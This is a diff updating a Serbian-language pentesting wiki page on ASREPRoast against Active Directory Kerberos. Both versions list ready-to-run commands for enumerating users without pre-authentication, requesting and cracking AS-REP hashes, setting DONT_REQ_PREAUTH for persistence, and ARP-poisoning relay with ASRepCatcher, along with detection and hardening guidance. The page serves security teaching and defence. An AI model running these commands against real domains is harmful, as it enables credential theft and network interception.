@@ -4,15 +4,16 @@
 
 ## ASREPRoast
 
-ASREPRoast je security attack koji iskorišćava korisnike kojima nedostaje atribut **Kerberos pre-authentication required**. U suštini, ova ranjivost napadačima omogućava da zatraže authentication za korisnika od Domain Controller-a (DC) bez potrebe za korisničkom lozinkom. DC zatim odgovara porukom enkriptovanom ključem izvedenim iz korisničke lozinke, koju napadači mogu pokušati da crack-uju offline kako bi otkrili korisničku lozinku.
+ASREPRoast je bezbednosni napad koji iskorišćava korisnike kojima nedostaje atribut **Kerberos pre-authentication required**. Ova ranjivost u suštini omogućava napadačima da od kontrolera domena (DC) zatraže autentifikaciju za korisnika bez potrebe za njegovom lozinkom. DC zatim odgovara porukom šifrovanom ključem izvedenim iz korisnikove lozinke, koju napadači mogu pokušati da razbiju offline kako bi otkrili korisnikovu lozinku.
 
-Glavni zahtevi za ovaj attack su:
+Glavni uslovi za ovaj napad su:
 
-- **Lack of Kerberos pre-authentication**: Ciljni korisnici ne smeju imati omogućenu ovu security funkciju.
-- **Connection to the Domain Controller (DC)**: Napadačima je potreban pristup DC-u kako bi slali zahteve i primali enkriptovane poruke.
-- **Optional domain account**: Domain account omogućava napadačima da efikasnije identifikuju ranjive korisnike pomoću LDAP upita. Bez takvog account-a, napadači moraju da pogađaju usernames.
+- **Nedostatak Kerberos pre-authentication**: Ova bezbednosna funkcija ne sme biti omogućena za ciljne korisnike.
+- **Veza sa kontrolerom domena (DC)**: Napadačima je potreban pristup DC-u kako bi slali zahteve i primali šifrovane poruke.
+- **Opcioni nalog na domenu**: Nalog na domenu omogućava napadačima da efikasnije identifikuju ranjive korisnike pomoću LDAP upita. Bez takvog naloga, napadači moraju da pogađaju korisnička imena.
 
-#### Enumerisanje ranjivih korisnika (potrebni domain credentials)
+#### Enumerisanje ranjivih korisnika (potrebni su akreditivi za domen)
+
 ```bash:Using Windows
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
@@ -20,7 +21,9 @@ Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```bash:Using Linux
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
 ```
-#### Zahtev za AS_REP poruku
+
+#### Zahtevanje AS_REP poruke
+
 ```bash:Using Linux
 # Installed package entrypoint (same logic as GetNPUsers.py)
 impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
@@ -34,26 +37,30 @@ python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat
 .\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
 ```
+
 > [!WARNING]
-> Rubeus podrazumevano zahteva **RC4**, pa Event ID **4768** obično prikazuje **preauth type 0** i **ticket encryption type 0x17**. Ako dodate **`/aes`** (ili je RC4 onemogućen za cilj), očekujte **AES etypes**. <sup>[[2]](#references)</sup>
+> Rubeus podrazumevano zahteva **RC4**, zato se u događaju ID **4768** obično prikazuje **preauth type 0** i **ticket encryption type 0x17**. Ako dodate **`/aes`** (ili je RC4 onemogućen za cilj), očekujte **AES etypes** umesto toga.<sup>[[2]](#references)</sup>
 
-#### Brzi one-liners (Linux)
+#### Brze jednolinijske komande (Linux)
 
-- Prvo enumerišite potencijalne ciljeve (npr. iz leaked putanja buildova) pomoću Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
-- Izvršite roast cele liste korisničkih imena bez validnih kredencijala koristeći NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
-- Ako imate kredencijale, prepustite NetExec-u da upita LDAP i zatraži svaki roastable nalog: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
-- Ako izlaz počinje sa **`$krb5asrep$23$`**, crackujte ga pomoću Hashcat-a **`-m 18200`**. Ako počinje sa **`$krb5asrep$17$`** ili **`$krb5asrep$18$`**, prednost dajte John-u **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>
+- Prvo nabrojte potencijalne ciljeve (npr. iz procurelih build putanja) pomoću Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
+- Roast-ujte celu listu korisničkih imena bez validnih creds pomoću NetExec-a: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
+- Ako imate creds, prepustite NetExec-u da upita LDAP i zatraži sve naloge koji mogu da se roast-uju: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
+- Ako izlaz počinje sa **`$krb5asrep$23$`**, razbijte ga pomoću Hashcat-a **`-m 18200`**. Ako počinje sa **`$krb5asrep$17$`** ili **`$krb5asrep$18$`**, radije koristite John **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>
 
-### Cracking
+### Razbijanje
 
-Nemojte pretpostaviti da je svaki AS-REP roast RC4. Moderni alati mogu vratiti **RC4** (`$krb5asrep$23$`) ili **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`), u zavisnosti od zahtevanog/negociranog enctype-a. **`hashcat -m 18200`** je namenjen za **etype 23**, dok **John** direktno podržava `krb5asrep` za **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>
+Nemojte pretpostavljati da je svaki AS-REP roast RC4. Moderni alati mogu da vrate **RC4** (`$krb5asrep$23$`) ili **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`), u zavisnosti od zatraženog/usaglašenog enctypa. **`hashcat -m 18200`** služi za **etype 23**, dok John direktno obrađuje `krb5asrep` za **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>
+
 ```bash
 john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
 hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
 ```
-### Perzistencija
 
-Podesite da **preauth** nije obavezan za korisnika nad kojim imate dozvole **GenericAll** (ili dozvole za upisivanje svojstava):
+### Persistence
+
+Nametni da **preauth** nije obavezan za korisnika za kog imaš dozvole **GenericAll** (ili dozvole za upisivanje svojstava):
+
 ```bash:Using Windows
 # Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
@@ -65,20 +72,24 @@ bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac 
 # Cleanup
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
 ```
-### Detekcija i hardening
 
-Uspešan roast proizvodi događaj **4768** na DC-u sa `Status=0x0` i `PreAuthType=0`. Nemojte zahtevati RC4 u detekciji: `TicketEncryptionType=0x17` je koristan signal slabe enkripcije, ali napadač može zahtevati AES (vrednosti u event logu `0x11`/`0x12`). Na Windows Server 2016 i novijim verzijama, sa kumulativnim ažuriranjem od 14. januara 2025. (ili novijim), verzija 2 događaja 4768 takođe prikazuje `ClientAdvertizedEncryptionTypes`, podržane etypes naloga/DC-a i dostupne ključeve.<sup>[[5]](#references)</sup>
+### Detekcija i ojačavanje
 
-Praktičan hunt označava klijenta koji oglašava samo RC4 dok nalog ima AES ključeve, a zatim koreliše nalete sa jedne izvorne IP adrese kroz više korisnika bez preautentifikacije. Napravite baseline legitimnih izuzetaka umesto da generišete alert za svaki događaj sa `PreAuthType=0`.
+Uspešan **AS-REP zahtev bez preautentifikacije** generiše događaj **4768** na DC-u sa vrednostima `Status=0x0` i `PreAuthType=0`; to beleži zahtev, ali ne dokazuje da je neko razbio odgovor ili kompromitovao nalog. Nemojte zahtevati RC4 u detekciji: `TicketEncryptionType=0x17` je koristan signal slabe enkripcije, ali napadač može da zatraži AES (vrednosti u dnevniku događaja `0x11`/`0x12`). Na Windows Server 2016 i novijim verzijama sa kumulativnim ažuriranjem od 14. januara 2025. (ili novijim), verzija 2 događaja 4768 prikazuje i `ClientAdvertizedEncryptionTypes`, podržane etype-ove naloga/DC-a i dostupne ključeve.<sup>[[5]](#references)</sup>
 
-Trajno rešenje je uklanjanje opcije **Do not require Kerberos preauthentication** za svakog korisnika kome ona strogo nije potrebna i rotiranje lozinki izloženih naloga. Ako izuzetak ne može da se ukloni, koristite dugu, nasumično generisanu lozinku i minimalne privilegije. Onemogućavanje RC4 povećava cenu cracking-a, ali ne uklanja roastability, jer AS-REP odgovori zasnovani na AES-u i dalje mogu da se crack-uju offline.<sup>[[2]](#references)[[5]](#references)</sup>
+Praktična pretraga označava klijenta koji oglašava samo RC4, dok nalog ima AES ključeve, a zatim povezuje nalete zahteva sa jedne izvorne IP adrese za više korisnika bez preautentifikacije. Postavite osnovnu liniju za legitimne izuzetke umesto da generišete upozorenje za svaki događaj `PreAuthType=0`.
 
-## ASREProast bez credentials
+Za pripisivanje normalizujte polje `IpAddress` (koje može sadržati IPv4 adresu mapiranu kao `::ffff:`) i uporedite vremenski prozor sa događajima 4769 za servisne karte ili 5140 za pristup deljenim resursima. Ti događaji mogu da navedu naloge aktivne sa iste adrese, ali za AS-REP zahtev bez preautentifikacije nije potreban autentifikovani nalog. Deljeni hostovi, NAT, proksiji i više sesija znače da poklapanje IP adrese **ne** identifikuje osobu ili nalog koji je poslao AS-REQ. Tretirajte povezane naloge kao tragove za istragu i potvrdite ih dokazima sa krajnje tačke ili mreže.<sup>[[5]](#references)[[7]](#references)[[8]](#references)</sup>
 
-Napadač na putanji može da presretne AS-REP vraćen tokom normalne, preautentifikovane AS razmene i formatira njegov enkriptovani deo za offline cracking. Za razliku od klasičnog ASREPRoasting-a, ovo ne zahteva `DONT_REQ_PREAUTH`; međutim, dobijaju se samo nalozi čija je Kerberos razmena zaista presretnuta. **ASRepCatcher** podrazumevano dobija poziciju pomoću jednosmernog ARP poisoning-a ili može da koristi saobraćaj iz druge MitM tehnike sa `--disable-spoofing`.<sup>[[6]](#references)</sup>\
-Ako želite srodni trik bez credentials-a koji vraća **service ticket** umesto **TGT**-a od principal-a bez preautentifikacije, pogledajte [Kerberoast](kerberoast.md).
+Trajno rešenje je da uklonite opciju **Do not require Kerberos preauthentication** za svakog korisnika kome ona nije striktno potrebna i promenite izložene lozinke naloga. Ako izuzetak ne može da se ukloni, koristite dugu, nasumično generisanu lozinku i dodelite minimalne privilegije. Onemogućavanje RC4 povećava cenu razbijanja lozinke, ali ne uklanja podložnost roastovanju jer se AES AS-REP odgovori i dalje mogu razbijati offline.<sup>[[2]](#references)[[5]](#references)</sup>
 
-U režimu `relay`, [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) prosleđuje presretnute AS-REQ-ove i forsira **RC4** kada ga obe strane još uvek dozvoljavaju. `listen` ne menja pakete i zato hvata enctype koji su klijent i DC dogovorili. Ograničite poisoning pomoću `-t`/`-tf` umesto da, kada je moguće, obuhvatite celu podmrežu.<sup>[[6]](#references)</sup>
+## ASREProast bez akreditiva
+
+Napadač na putanji može da uhvati AS-REP koji se vraća tokom uobičajene, preautentifikovane AS razmene i da formatira njegov šifrovani deo za offline razbijanje lozinke. Za razliku od klasičnog ASREPRoasting-a, za ovo nije potreban `DONT_REQ_PREAUTH`; međutim, tako se dobijaju samo nalozi čija je Kerberos razmena zaista presretnuta. **ASRepCatcher** podrazumevano zauzima poziciju pomoću jednosmernog ARP poisoning-a ili može da preuzima saobraćaj iz druge MitM tehnike pomoću opcije `--disable-spoofing`.<sup>[[6]](#references)</sup>\
+Ako želite srodnu tehniku bez akreditiva koja vraća **service ticket** umesto **TGT**-a od principal-a bez preautentifikacije, pogledajte [Kerberoast](kerberoast.md).
+
+U režimu `relay`, [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) prosleđuje presretnute AS-REQ zahteve i nameće **RC4** kada ga obe strane i dalje dozvoljavaju. `listen` ne menja pakete i zato hvata enctype koji su klijent i DC dogovorili. Kad god je moguće, ograničite poisoning pomoću `-t`/`-tf` umesto da utičete na celu podmrežu.<sup>[[6]](#references)</sup>
+
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
 ASRepCatcher relay -dc $DC_IP
@@ -92,9 +103,8 @@ ASRepCatcher listen
 # Scope targets and save directly in Hashcat format
 ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
 ```
+
 ---
-
-
 
 ---
 
@@ -104,6 +114,8 @@ ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -form
 - [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
 - [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
 - [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
-- [5] [Microsoft – Događaj 4768: Zatražena je Kerberos autentikaciona karta](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
+- [5] [Microsoft – Događaj 4768: Zatražena je Kerberos autentifikaciona karta](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
 - [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
+- [7] [Microsoft – Bezbednosni događaj 4769](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
+- [8] [Microsoft – Bezbednosni događaj 5140](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5140)
 {{#include ../../banners/hacktricks-training.md}}
